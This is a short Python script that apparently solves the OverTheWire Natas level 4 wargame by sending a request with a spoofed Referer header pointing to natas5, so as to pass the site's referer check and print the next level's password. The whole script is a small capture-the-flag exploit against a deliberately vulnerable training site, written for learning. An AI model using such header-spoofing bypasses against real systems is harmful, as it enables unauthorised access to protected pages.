import requests
import time

url = "http://natas4.natas.labs.overthewire.org/"
auth = ("natas4", "secret")



session = requests.Session()
session.auth = auth

print("Connecting. . .")

headers = {"referer": "http://natas5.natas.labs.overthewire.org/"}

res_get = session.get(url, headers=headers, timeout=5) # Creating the session to mimic a browser

if res_get.status_code == 200:
    print("[+]Connected!")
    print("[+]Here your password:")
    time.sleep(1.3)
    print(res_get.text)
else:
    print(f"[-]Error to connect the server. ERROR CODE: {res_get.status_code}")